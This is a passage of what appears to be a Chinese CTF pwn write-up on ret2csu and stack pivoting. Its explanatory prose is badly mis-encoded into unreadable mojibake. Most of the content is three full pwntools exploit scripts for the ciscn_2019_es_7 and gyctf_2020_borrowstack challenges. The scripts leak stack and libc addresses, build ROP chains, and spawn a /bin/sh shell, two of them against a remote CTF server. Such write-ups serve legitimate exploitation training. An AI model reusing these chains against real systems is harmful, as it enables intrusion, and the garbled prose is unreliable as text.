<p>å…ˆå‘é€1ç„¶ågdbæŸ¥çœ‹<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729224838828.png" alt="image-20230729224838828"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729231040910.png" alt="image-20230729231040910"></p>
<p>æ³„éœ²çš„å†…å®¹æ˜¯çº¢çº¿çš„éƒ¨åˆ†ï¼ˆå½“ç„¶ç”±äºåªèƒ½æ³„éœ²0x30ä¸ªå­—èŠ‚ï¼Œæˆ‘çº¢çº¿åœˆå¤šäº†ï¼Œä½†æ˜¯æˆ‘æƒ³å¼ºè°ƒçš„æ˜¯æ ˆåœ°å€æ³„éœ²ï¼Œæ³„éœ²çš„æ˜¯å†…å®¹ï¼Œè€Œéæ ˆçš„åœ°å€ï¼‰</p>
<p>ä¸è¿‡æˆ‘ä»¬å‘ç°äº†ç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªæ³„éœ²çš„æ ˆä¸­çš„å†…å®¹æ˜¯æŒ‡å‘äº†æ ˆçš„åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨æ³„éœ²çš„æ ˆçš„å†…å®¹é…åˆåç§»ï¼Œæ¥è·å–æ ˆçš„åœ°å€äº†.</p>
<p>ç»è¿‡è°ƒè¯•å‘ç°ï¼Œvulå‡½æ•°çš„è¿”å›åœ°å€å°±æ˜¯æ­¤æ—¶æ ˆé¡¶çš„ï¼Œæˆ‘ä»¬æ˜¯è¦åŠ«æŒç¨‹åºçš„æ‰§è¡Œæµï¼Œå› æ­¤ç¬¬ä¸€ä¸ªåœ°å€è‚¯å®šæ˜¯æ²¡æ³•æ³„éœ²äº†ï¼Œæˆ‘ä»¬æ¥æ³„éœ²ç¬¬ä¸‰ä¸ªæ ˆçš„å†…å®¹ã€‚ç„¶åæŠŠè¿”å›åœ°å€å¡«å†™æˆvulå‡½æ•°çš„é¦–åœ°å€ï¼Œè®©ç¨‹åºå†æ‰§è¡Œä¸€æ¬¡ï¼ˆå»è¿›è¡Œret2csuï¼‰</p>
<p>æ‹¿åˆ°æ ˆä¸­ç¬¬ä¸‰ä¸ªå†…å®¹åï¼Œçœ‹ä¸€ä¸‹å®ƒè·ç¦»æˆ‘ä»¬è¾“å…¥çš„å†…å®¹çš„é¦–åœ°å€åç§»æ˜¯å¤šå°‘.<br><img src="https://img2022.cnblogs.com/blog/2706180/202202/2706180-20220218171939424-200600591.png" alt="img"></p>
<p>expï¼š</p>
<pre><code class="python">from pwn import *
from LibcSearcher import *

context(arch=&#39;amd64&#39;,os=&#39;linux&#39;,log_level=&#39;debug&#39;)

p = remote(&#39;node4.buuoj.cn&#39;, 26250)
#p = process(&#39;./a&#39;)
e = ELF(&#39;./a&#39;)

csu_gadget1 = 0x40059A
modify_rax = 0x4004E2
csu_gadget2 = 0x400580
term_proc = 0x600e50#pwndbg&gt;search -p åœ°å€ æŸ¥æ‰¾
bss_addr = 0x601030
pop_rdi_addr = 0x4005a3
syscall_addr = 0x400517
read_syscall = 0x4004ED
offset = 16

payload = &#39;/bin/sh\x00&#39;.ljust(16, &#39;\x00&#39;).encode() + p64(read_syscall)
p.send(payload)
p.recvuntil(b&#39;\x05\x40\x00\x00\x00\x00\x00&#39;)
leak_addr = u64(p.recv(8))
print(hex(leak_addr))

bin_sh_addr = leak_addr - 280
print(hex(bin_sh_addr))

payload = &#39;/bin/sh\x00&#39;.ljust(16, &#39;\x00&#39;).encode() + p64(csu_gadget1)
payload += p64(0) + p64(1)
payload += p64(term_proc)
payload += p64(0) + p64(0) + p64(0)
payload += p64(csu_gadget2)
payload += b&#39;a&#39; * 56
payload += p64(modify_rax)
payload += p64(pop_rdi_addr) + p64(bin_sh_addr)
payload += p64(syscall_addr)
p.send(payload)
p.interactive()
</code></pre>
<h4 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a>gyctf_2020_borrowstack</h4><p>å…¶å®å¯ä»¥ç›´æ¥ret2libcï¼ˆğŸ¤¡ï¼‰w å­¦ä¹ è®°å½•äº†</p>
<pre><code class="python">from pwn import *
from LibcSearcher import *

r=remote(&#39;node4.buuoj.cn&#39;,25408)

bank=0x0601080
leave=0x400699
puts_plt=0x04004E0
puts_got=0x0601018
pop_rdi=0x400703
main=0x0400626
ret=0x4004c9

r.recvuntil(&#39;u want&#39;)
payload=b&#39;a&#39;*0x60+p64(bank)+p64(leave)
r.send(payload)

r.recvuntil(&#39;now!&#39;)
payload=p64(ret)*20+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
r.send(payload)
r.recvline()
puts_addr=u64(r.recv(6).ljust(8,b&#39;\x00&#39;))
print(hex(puts_addr))

libc=LibcSearcher(&#39;puts&#39;,puts_addr)
libc_base=puts_addr-libc.dump(&#39;puts&#39;)

one_gadget=libc_base+0x4526a

#system=libc_base+libc.dump(&#39;system&#39;)
#binsh=libc_base+libc.dump(&#39;str_bin_sh&#39;)

#payload=b&#39;a&#39;*(0x60+8)+p64(pop_rdi)+p64(binsh)+p64(system)
payload=b&#39;a&#39;*(0x60+8)+p64(one_gadget)
r.send(payload)

r.interactive()
</code></pre>
<p><strong>æ€è·¯ï¼š</strong>åˆ©ç”¨putså‡½æ•°æ³„éœ²libcå¾—åˆ° åœ¨bssæ®µä¸Šå†™å…¥åˆ©ç”¨ropå†™å…¥shellcode</p>
<p><strong>é—®é¢˜ï¼š</strong>bufåªæœ‰0x10å¤§å°ï¼Œå¦‚ä½•åœ¨bssæ®µé¡ºåˆ©å†™å…¥å‘¢ï¼Ÿ<br><strong>Answerï¼š</strong>bufåªèƒ½è¦†ç›–åˆ°retï¼Œä½†bankï¼ˆï¼‰åœ¨bssæ®µ<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005633820.png"></p>
<p>åœ¨bufå¤„åˆ©ç”¨leaveæŒ‡ä»¤åŠ«æŒæ ˆè·³è½¬åˆ°bankå¤„ï¼Œå†™å…¥shellcode</p>
<p>ï¼ˆ1ï¼‰checksec</p>
<p>   <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731004821556.png" alt="image-20230731004821556"></p>
<p>ï¼ˆ2ï¼‰Lovely Woman  <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005122883.png" alt="image-20230731005122883"></p>
<p>NXä¿æŠ¤æ‰“å¼€ï¼Œæ ˆä¸Šæ— systemï¼ˆï¼‰å’Œâ€&#x2F;bin&#x2F;shâ€ -&gt;libcæ³„éœ²</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005742112.png" alt="image-20230731005742112"></p>
<p>exp</p>
<pre><code class="python">from pwn import *
p=process(&#39;./stack&#39;)
context(arch=&#39;amd64&#39;,os=&#39;linux&#39;,log_level=&#39;debug&#39;)
e=ELF(&#39;./stack&#39;)
libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
puts_plt_addr=e.plt[&#39;puts&#39;]
puts_got_addr=e.got[&#39;puts&#39;]
read_plt_addr=e.got[&#39;read&#39;]#why got here 
#callå‡½æ•°ä¸ºè·³è½¬åˆ°æŸåœ°å€å†…æ‰€ä¿å­˜çš„åœ°å€ï¼Œåº”è¯¥ä½¿ç”¨gotè¡¨ä¸­çš„åœ°å€
pop_rdi_addr=0x400703
level_addr=0x400699
bss_addr=0x601080#bank_addr
ret_csu_addr=0x4006FA
rsi_addr=0x601118
payload1=b&#39;a&#39;*0x60+p64(bss_addr+0x40)+p64(level_addr)#è¿™é‡Œå¤šåŠ 0x40çš„ç›®çš„å°±æ˜¯ä¸ºäº†æ‰§è¡Œputsçš„æ—¶å€™ï¼Œä¸å½±å“ä¹‹å‰çš„gotè¡¨ä¸­çš„æ•°æ®
p.sendafter(&#39;u want\n&#39;,payload1)
payload2=b&#39;a&#39;*0x40+p64(0)+p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)
payload2+=p64(ret_csu_addr)+p64(0)+p64(0)+p64(read_plt_addr)+p64(0x100)
payload2+=p64(rsi_addr)+p64(0)+p64(0x4006E0)#why is there an address here
#è¿™ä¸€ä¸ª4006E0ä»…ä»…æ˜¯ret2csuæ‰§è¡Œäº†popä¹‹åçš„retçš„è¿”å›çš„åœ°å€ã€‚
#è‡³äºæ€ä¹ˆè¿”å›åˆ°one_gadgetä¸Šçš„ï¼Œæ˜¯å› ä¸ºreadçš„è¿”å›åœ°å€è¢«readè‡ªå·±ç»™æ”¹äº†
#payload2ä¸­çš„ç¬¬ä¸€ä¸ªp64(0)æ˜¯å»å ä¸ªåœ°æ–¹ï¼Œå› ä¸ºæ ˆè¿ç§»æœ¬èº«çš„ç‰¹æ€§ï¼Œè¿ç§»åçš„ç¬¬ä¸€ä¸ªå†…å­˜å•å…ƒä¸æ‰§è¡Œ
p.sendafter(&#39;k now!\n&#39;,payload2)
puts_addr=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
libc_base=puts_addr-libc.symbols[&#39;puts&#39;]
one_gadget=libc_base+0x4f432
p.sendline(p64(one_gadget))#why p64 here #åªè¦æ˜¯å‘é€åœ°å€ å°±è¦ç»è¿‡æ‰“åŒ…ä¹‹åå‘é€
p.interactive()
</code></pre>
<p>â—â—â—u1s1â—â—â—<br>ä¸ç®¡ç”¨å“ªä¸ªæ–¹æ³•ï¼Œéƒ½éœ€è¦è€ƒè™‘åˆ©ç”¨å‡½æ•°ï¼ˆbankï¼‰ä¸gotè¡¨é—´è·ç¦».åœ¨æ ˆè¿æ—¶éœ€è¦æŠŠåœ°å€ç›¸å¯¹æŠ¬é«˜äº›ï¼Œé˜²æ­¢ç ´ågotè¡¨.</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731155611578.png" alt="image-20230731155611578"></p>
<p>ä¸‹é™„æ ˆè¿ç§»ç›¸å…³èµ„æ–™ï¼š</p>
<p>[]: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/15817337.html">https://www.cnblogs.com/ZIKH26/articles/15817337.html</a></p>
<p><strong>tipsï¼š</strong>æ²¡æ³•æ³„éœ²libcæ—¶å¯ç”¨one_gadgetï¼Œåˆ©ç”¨åœ¨çº¿ç½‘ç«™</p>
<p>[]: <a target="_blank" rel="noopener" href="https://libc.blukat.me/?q=puts:690&amp;l=libc6_2.23-0ubuntu11_amd64">https://libc.blukat.me/?q=puts:690&amp;l=libc6_2.23-0ubuntu11_amd64</a></p>
<p>å°†æ³„éœ²å‡½æ•°ï¼ˆæœ¬é¢˜ä¸ºputs å…¶ä»–å‡½æ•°æ˜¯å¦ç›¸åŒ æœ‰å¾…è€ƒç©¶ï¼‰çš„åä¸‰ä½ï¼Œæ‰¾åˆ°libcç‰ˆæœ¬</p>
<pre><code>$ one_gadget libcç‰ˆæœ¬
</code></pre>

  </div>
</article>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Articles</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/links/">Links</a></li>
        
          <li><a href="/tags/">Tags</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2csu"><span class="toc-number">1.</span> <span class="toc-text">ret2csu</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.1.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%EF%BC%88%E8%92%B8%E7%B1%B3ROP%EF%BC%89"><span class="toc-number">1.0.2.</span> <span class="toc-text">å®ä¾‹ï¼ˆè’¸ç±³ROPï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">æ€è·¯</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E9%A2%98%E7%9B%AE"><span class="toc-number">1.0.3.</span> <span class="toc-text">å…¶ä»–é¢˜ç›®</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ciscn-2019-es-7%EF%BC%88%E5%85%B6%E5%AE%9ESROP%EF%BC%89"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">ciscn_2019_es_7ï¼ˆå…¶å®SROPï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gyctf-2020-borrowstack"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">gyctf_2020_borrowstack</span></a></li></ol></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yubut.github.io/2023/09/01/ret2csu/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yubut.github.io/2023/09/01/ret2csu/&text=ret2csu"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yubut.github.io/2023/09/01/ret2csu/&title=ret2csu"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yubut.github.io/2023/09/01/ret2csu/&is_video=false&description=ret2csu"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ret2csu&body=Check out this article: https://yubut.github.io/2023/09/01/ret2csu/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yubut.github.io/2023/09/01/ret2csu/&title=ret2csu"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yubut.github.io/2023/09/01/ret2csu/&title=ret2csu"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yubut.github.io/2023/09/01/ret2csu/&title=ret2csu"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yubut.github.io/2023/09/01/ret2csu/&title=ret2csu"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yubut.github.io/2023/09/01/ret2csu/&name=ret2csu&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yubut.github.io/2023/09/01/ret2csu/&t=ret2csu"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> èœå•</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> ç›®å½•</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> åˆ†äº«</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> è¿”å›é¡¶éƒ¨</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
    <div class="footer-left">
        Copyright Â©
        
        
        2023-2024
        yub
        <br>
        <!-- åˆ é™¤å¤‡æ¡ˆä¿¡æ¯ï¼Œå¦‚æœä¸éœ€è¦å¤‡æ¡ˆå¯ä»¥çœç•¥ä»¥ä¸‹è¡Œ -->
        <!-- <a href="https://beian.miit.gov.cn/" target="_blank">xICPå¤‡xxxxxxxxå·-x</a> -->
    </div>

    <div class="footer-right">
        <nav>
            <ul>
                
                <li><a href="/">Home</a></li>
                
                <li><a href="/about/">About</a></li>
                
                <li><a href="/archives/">Articles</a></li>
                
                <li><a href="/categories/">Categories</a></li>
                
                <li><a href="/links/">Links</a></li>
                
                <li><a href="/tags/">Tags</a></li>
                
                <li><a href="/search/">Search</a></li>
                
            </ul>
            
            <ul>
                <span id="busuanzi_container_site_pv">
                    æœ¬ç«™æ€»è®¿é—®é‡<span id="busuanzi_value_site_pv"></span>æ¬¡
                </span>
                <span class="post-meta-divider">|</span>
                <span id="busuanzi_container_site_uv" style='display:none'>
                    æœ¬ç«™è®¿å®¢æ•°<span id="busuanzi_value_site_uv"></span>äºº
                </span>
                <!-- å¼•å…¥ä¸è’œå­è„šæœ¬ -->
                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            </ul>
            
        </nav>
    </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"å¤åˆ¶åˆ°ç²˜è´´æ¿ï¼\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "å¤åˆ¶æˆåŠŸï¼");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
